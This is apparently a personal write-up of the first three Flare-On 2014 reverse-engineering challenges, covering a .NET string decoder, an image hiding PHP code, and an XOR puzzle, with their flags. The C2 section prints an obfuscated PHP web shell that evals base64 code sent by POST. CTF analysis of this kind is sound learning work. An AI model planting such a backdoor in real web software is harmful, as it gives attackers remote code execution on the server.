# Overview

I've began to learn reverse engineering, and by the end of this year I aim to be decent at it, I will start with the Flare On and bunch of other challenges.

## C1

Its a Windows Form with Bob Ross on it.

[a](/images/flareon2014/c1_1.png)

I've noticed the title of the Program `Form 1` and thought that this is .NET binary, I loaded it into `dnSpy` and explored it.

[a](/images/flareon2014/c1_2.png)

We are having a hidden resource called `dat_secret` which are random bytes, then we have a decryption function that looks like this:

```csharp
// Token: 0x06000002 RID: 2 RVA: 0x00002060 File Offset: 0x00000260
private void btnDecode_Click(object sender, EventArgs e)
{
    this.pbRoge.Image = Resources.bob_roge;
    byte[] dat_secret = Resources.dat_secret;
    string text = "";
    foreach (byte b in dat_secret)
    {
        text += (char)((b >> 4 | ((int)b << 4 & 240)) ^ 41);
    }
    text += "\0";
    string text2 = "";
    for (int j = 0; j < text.Length; j += 2)
    {
        text2 += text[j + 1];
        text2 += text[j];
    }
    string text3 = "";
    for (int k = 0; k < text2.Length; k++)
    {
        char c = text2[k];
        text3 += (char)((byte)text2[k] ^ 102);
    }
    this.lbl_title.Text = text3;
}
```

We transform the text 3 times, first we byte swap it and xor it with 41 then we do some char swapping and then we xor it again with 102.

Now, I wanted to debug the function, so that I can inspect what would be the text after the first transformation.

So, we have the `"3rmahg3rd.b0b.d0ge@flare-on.com"` string which is our flag.

## C2 

This challenge starts with a simple home page and an image with the flare logo.

```
drwxr-xr-x 5 vscode vscode 4096 May  6 07:28 .
drwxr-xr-x 3 vscode vscode 4096 May  6 07:24 ..
-rw-r--r-- 1 vscode vscode 8375 May  6 07:25 home.html
drwxr-xr-x 2 vscode vscode 4096 May  6 07:25 img
```

Upon first inspection there isn't anything, but we can inspect it with `exiftool`:

```

```

And we can see the warning, next we can use `strings` which will reveal this php monstrosity:

```php
<?php $terms=array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);$do_me="";for($i=0;$i<count($order);$i++){$do_me=$do_me.$terms[$order[$i]];}eval($do_me); ?>
```

If we follow the decryption, we would end up with `$do_me` being:

```php
<?php
$a= 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\';$__=\'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';

$b="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65"; //base64_decode

eval($b($a));
```

Then we decrypt the next bit:

```php
if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) { eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"])); }
```

The text `\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D` is mix of ascii and hex representation, we can just use `echo`.



If we replace them we eventually will get:

```
a11DOTthatDOTjava5crapATflareDASHonDOTcom
a11.that.java5crap@flare-on.com
```

### C3 

```python
string = [7,8,2,0xF,0x15,9,0xF,0x0F,0x12,0xF,4,3,1,0x0F,8,0x15]

for i in string:
    s = chr(i ^ 0x66)
    print(s, end="")
```

```
$ python3 main.py
andisoiitibegins%   
```
